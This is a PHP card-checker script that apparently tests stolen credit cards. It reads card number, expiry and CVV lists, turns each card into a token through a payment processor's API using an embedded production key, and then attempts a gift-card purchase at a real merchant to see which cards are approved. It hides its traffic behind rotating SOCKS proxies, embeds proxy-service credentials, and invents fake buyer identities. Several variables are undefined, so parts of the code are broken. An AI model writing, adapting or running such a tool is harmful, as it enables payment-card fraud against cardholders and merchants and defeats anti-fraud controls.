<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

If(strlen($ano) > 2)
{
  $ano1 = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
// $email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
$lname = 'Wang';
$email1 = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
 // $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);








// curl_close($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api2-c.heartlandportico.com/SecureSubmit.v1/api/token?callback=jsonp_callback_61596&token_type=supt&object=token&_method=post&api_key=pkapi_prod_aEVgDT7HWL4SkAfTUH&card%5Bnumber%5D='.$cc.'&card%5Bexp_month%5D='.$mes.'&card%5Bexp_year%5D='.$ano.'&card%5Bcvc%5D='.$cvv.'');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
   curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
   curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9',
'Host: api2-c.heartlandportico.com',
'Referer: https://api2-c.heartlandportico.com/SecureSubmit.v1/token/2.2.1/field.html',
'user-agent: '.$browser.''
));

// curl_setopt($ch, CURLOPT_POSTFIELDS, '');


$b_pago = curl_exec($ch);

$token = trim(strip_tags(getstr($b_pago,'"token_value": "','"')));
$number = trim(strip_tags(getstr($b_pago,'"number": "','"')));

 $country = trim(strip_tags(getstr($b_pago,'"issuingCountry":"','"')));
 $bank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
 $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
 $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
 $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));


  // echo $b_pago;

// echo $token;

// echo $ccnum;
// echo $mes1;
// echo $ano;
// echo $cvv;

// // //////////////////////// START REQUEST 2 ////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.sight-sound.com/orders/payment');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ0b2tlbiI6eyJhcGlLZXkiOiJlMmIxNjY5YS0zMGJlLTQxMGQtOWI3Yi0yM2QwMzU5MmM5NzAiLCJleHBpcmVzIjoiMjAyMC0wNi0xOFQwMjo1Njo1NiJ9fQ.dpdXVmoTy6BTcxwLYNtRCVMy7GaLHASWtWDlj4ro7hC8FKP1GtBrnnsLszSrNlheA2q2DhWHCXnjLGlbIXT5Tg',
'content-type: application/json',
'origin: https://sight-sound.com',
'referer: https://sight-sound.com/',
'user-agent: '.$browser.''
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"busCount":null,"payment":{"cardNumber":"'.$cc4.'","paymentToken":"'.$token.'","cardType":"visa","name":"Vincent Warner"},"paymentGC":null,"cart":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1OTIzNzkzNDEsImNhcnQiOnsib3JkZXIiOnsib3JkZXJOdW1iZXIiOi0xOTg0OTg5NiwiY3VzdG9tZXJOdW1iZXIiOjUwMDIsInN0YXR1c0NEIjoiT1BFTiIsIm1haWxUb2FkZHJlc3MiOnsibWFpbFRvUGhvbmVOdW1iZXIiOiI1MTgyNjQxNTI0IiwibWFpbFRvQ29tcGFueU5hbWUiOm51bGwsIm1haWxUb0ZpcnN0TmFtZSI6IlZJTkNORVQiLCJtYWlsVG9MYXN0TmFtZSI6IldBUk5FUiIsImFkZHJlc3MxIjoiMTIgQVZFTlVFIiwiYWRkcmVzczIiOm51bGwsImNpdHkiOiJNSUFNSSIsInN0YXRlIjoiRkwiLCJ6aXAiOiIzMzEwMSIsImNvdW50cnkiOiJVU0EifSwib3JkZXJEYXRlIjoiMjAyMC0wNi0xN1QwMjo1NzozNSIsInNwZWNpYWxSZW1vdmVkIjpmYWxzZSwiZmluYWxQYXltZW50RHVlRGF0ZSI6IjIwMjAtMDYtMTdUMDM6MDU6NDEiLCJhZGRVc2VySUQiOiIqT09PTyIsImFkZExvY2F0aW9uQ0QiOiJJTlRFUk5FVCIsImVkaXRVc2VySUQiOiIqT09PTyIsImVkaXREYXRlIjoiMjAyMC0wNi0xN1QwMjo1NzozNSIsIm9yZGVyT3JpZ2luIjoiSU5URVJORVQiLCJvcmRlclRvdGFsUHJpY2UiOjEwLjAsInNsaWRpbmdTY2FsZURpc2NvdW50IjowLjAsInRpZXJZZWFyIjoyMDIwLCJzZXNzaW9uUGFpZEFtb3VudCI6MC4wLCJhbW91bnRQYWlkV2hlbk9yZGVyTG9hZGVkIjowLjAsIm1vbmV5T25BY2NvdW50IjowLjAsImFtb3VudFJlZnVuZGVkV2hlbk9yZGVyTG9hZGVkIjowLjAsInNlc3Npb25SZWZ1bmRBbW91bnQiOjAuMCwiY29udGFjdEZpcnN0TmFtZSI6IlZJTkNORVQiLCJjb250YWN0TGFzdE5hbWUiOiJXQVJORVIiLCJtYWlsVG9TYW1lQXNDdXN0b21lciI6IlkiLCJlZGl0TW9kZSI6ZmFsc2UsIm1vZGlmaWVkIjp0cnVlLCJpc05ldyI6dHJ1ZSwidGllckNEIjoiTk9MRVZFTCIsInByZXNlbnRlZEJ5TmFtZSI6InNhbSIsImZpbmFsU2FsZVlOIjoiTiIsImJpbGxpbmdBZGRyZXNzIjp7ImZpcnN0TmFtZSI6bnVsbCwibGFzdE5hbWUiOm51bGwsImFkZHJlc3MxIjoiMTIgQVZFTlVFIiwiYWRkcmVzczIiOm51bGwsImNpdHkiOiJNSUFNSSIsInN0YXRlIjoiRkwiLCJ6aXAiOiIzMzEwMSIsImNvdW50cnkiOiJVU0EifSwibWFpbFRvQWRkcmVzc1ZlcmlmaWVkWU4iOiJOIiwic3BlY2lhbEF1dG9BcHBsaWVkWU4iOiJOIiwic2VhdHNMb2NrZWRUaW1lIjowLCJvcmRlclRva2VuIjoiZDExZjUxYTgtNGQ1MC00MGY0LWI2NzctNTI0NGM4ZmU3NzM4IiwidG90YWxTYXZpbmdzIjowLjAsImZpbmFsU2FsZURheXMiOjMwLCJ0b3RhbEJhbGFuY2UiOjEwLjAsInRvdGFsRGlzY291bnQiOjAuMCwidHJhbnNhY3Rpb25DaGFyZ2UiOjAuMCwidGF4ZXMiOjAuMCwic2hpcHBpbmdBbmRIYW5kbGluZyI6MC4wLCJleHBlZGl0ZWRTaGlwcGluZyI6MC4wLCJpbnRlcm5hdGlvbmFsU2hpcHBpbmciOjAuMCwiaXRlbUxpc3QiOlt7Iml0ZW1UeXBlQ0QiOiJHSUZUQ0FSRCIsImV2ZW50Q0QiOiJHSUZUQ0FSRCIsImV2ZW50RGF0ZVRpbWUiOiIyMDIwLTA2LTE3VDAyOjU3OjM1Iiwic3RhdHVzQ0QiOiJBQ1RJVkUiLCJsdW1wU3VtRGlzY291bnQiOjAuMCwiYnVzQ291bnQiOjAsImFkZERhdGUiOjE1OTIzNzcwNTU0MzcsImFkZFVzZXJpZCI6IipPT09PIiwiYWRkTG9jYXRpb24iOiJJTlRFUk5FVCIsImVkaXRNb2RlIjpmYWxzZSwibW9kaWZpZWQiOnRydWUsImlzTmV3Ijp0cnVlLCJzZW5kVG9BY2NwYWMiOmZhbHNlLCJsb2dDaGFuZ2VzIjpmYWxzZSwiaXRlbVRvdGFsUHJpY2UiOjEwLjAsIml0ZW1Ub3RhbEZlZXMiOjAuMCwiaXRlbVRvdGFsVGF4ZXMiOjAuMCwiaXRlbUdyYW5kVG90YWxQcmljZSI6MTAuMCwic2t1Q2QiOiJHSUZUX0NBUkQiLCJza3VEZXNjIjoiR2lmdCBDYXJkIiwic2t1QmluTG9jIjoiTUxXSCIsImZyZWVJdGVtWU4iOiJOIiwibG9ja2VkU2VhdFlOIjoiTiIsIm1lcmNoSXRlbURlc2MiOiJHaWZ0IENhcmQiLCJvcmRlck51bWJlciI6LTE5ODQ5ODk2LCJpdGVtTnVtYmVyIjoxLCJpdGVtVG90YWxDb3VudCI6MSwidG90YWxEaXNjb3VudCI6MC4wLCJpdGVtRGV0YWlsTGlzdCI6W3sib3JkZXJJdGVtRGV0YWlsc0tleSI6e30sImN1c3REaXNjVHlwZSI6Ik4iLCJzcGVjaWFsRGlzY1R5cGUiOiJOIiwibWFuRGlzY1R5cGUiOiJOIiwiY291bnQiOjEsImxpc3RQcmljZSI6MTAuMCwicHJpY2VWYWx1ZSI6MC4wLCJjb21wQ291bnQiOjAsImN1c3REaXNjQ291bnQiOjAsImN1c3REaXNjVmFsdWUiOjAuMCwiY3VzdERpc2NUb3RhbEFtb3VudCI6MC4wLCJzcGVjaWFsRGlzY0NvdW50IjowLCJzcGVjaWFsRGlzY1ZhbHVlIjowLjAsInNwZWNpYWxEaXNjVG90YWxBbW91bnQiOjAuMCwibWFuRGlzY0NvdW50IjowLCJtYW5EaXNjVmFsdWUiOjAuMCwibWFuRGlzY1RvdGFsQW1vdW50IjowLjAsInNlYXREaXNjQ291bnQiOjAsInNlYXREaXNjQW1vdW50IjowLjAsInNlYXREaXNjVG90YWxBbW91bnQiOjAuMCwiaXNOZXciOnRydWUsInVuaXRQcmljZSI6MTAuMCwiZGlzY291bnRQcmljZSI6MC4wLCJvcmRlck51bWJlciI6MCwiaXRlbU51bWJlciI6MSwiZGVzaWduYXRpb25DRCI6IkFOWSIsImRlc2lnVG90YWxQcmljZSI6MTAuMCwidG90YWxEaXNjb3VudCI6MC4wfV19XX0sImN1c3RvbWVyIjp7ImNvbnRhY3QiOnsiZmlyc3ROYW1lIjoiVklOQ05FVCIsImxhc3ROYW1lIjoiV0FSTkVSIiwicGhvbmVOdW0iOiI1MTgtMjY0LTE1MjQiLCJlbWFpbEFkZHIiOiJwdWJna2l0dHVAZ21haWwuY29tIn0sImFkZHJlc3MiOnsic3RyZWV0MSI6IjEyIEFWRU5VRSIsImNpdHkiOiJNSUFNSSIsInN0YXRlQ29kZSI6IkZMIiwiemlwQ29kZSI6IjMzMTAxIiwiY291bnRyeUNvZGUiOiJVU0EiLCJ2ZXJpZmllZFlOIjoiTiJ9LCJjdXN0Tm8iOiIyMzE5NzgwIiwiYWRkRGF0ZSI6IjIwMjAtMDYtMTdUMDI6NTg6MDYifX19.PB2araU8h7EoInhK8zSJ1YEXP3_fqDbbqapIOJMQMLXXV_ARsDYIIGCDHGGt6__VDwzCPjvsnJlNXe4Jo7bmkA"}');

// // // // //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);

// //////////////////////// START POST FILED 1 ////////////////////////


$message = trim(strip_tags(getstr($result,'"','"')));
// $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));



// // // // /////////////////////// RESULT ////////////////////////////////////
// if(strpos($result,'"result":"success"')){
// // updatecart();
//       echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
//     }
// elseif(strpos($result,'Not Acceptable!')) {

//             echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';

//   }

// else {
              echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
  // }
curl_close($curl);
ob_flush();
     // echo $result;
?>
